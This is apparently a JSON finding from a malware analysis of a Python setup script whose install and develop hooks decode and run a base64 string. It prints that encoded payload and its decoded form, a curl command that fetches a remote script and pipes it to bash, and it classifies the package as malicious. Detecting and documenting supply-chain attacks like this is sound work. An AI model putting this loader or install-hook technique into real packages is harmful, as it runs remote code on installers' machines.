{
  "purpose": "To define a setup script for a Python package that includes a malicious payload executed during installation.",
  "sources": "The base64-encoded string decoded in 'notmalfunc' which is executed via os.system.",
  "sinks": "os.system call executing decoded code, which is a shell command.",
  "flows": "Base64-encoded string decoded in 'b64d' function, then passed to 'os.system' in 'notmalfunc', leading to command execution.",
  "anomalies": "Use of base64 encoding to obscure malicious command, execution of arbitrary shell command during package installation.",
  "analysis": "The script imports setuptools and overrides install and develop commands to include a call to 'notmalfunc' during installation. The 'notmalfunc' function decodes a base64 string and executes it via 'os.system'. The base64 string 'Y3VybCAgLXMgaHR0cDovLzE5Mi4xNjguMS4zNDo4MDAwL3Rlc3QudHh0IHwgYmFzaAo=' decodes to 'curl -s http://192.168.1.34:8000/test.txt | bash', which attempts to fetch and execute a script from an external server. This is a clear malicious behavior, attempting to run remote code on the host system during package installation. The rest of the code is standard setup code with no other suspicious behavior. The use of base64 and execution during install strongly indicates malicious intent.",
  "conclusion": "The package contains malicious code that executes a remote script during installation, representing a high security threat. The decoding and execution of remote commands are classic signs of malicious supply chain activity.",
